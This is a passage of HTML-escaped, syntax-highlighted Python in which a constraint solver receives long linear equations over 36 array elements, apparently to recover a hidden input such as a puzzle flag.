style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;44677&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17772&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span 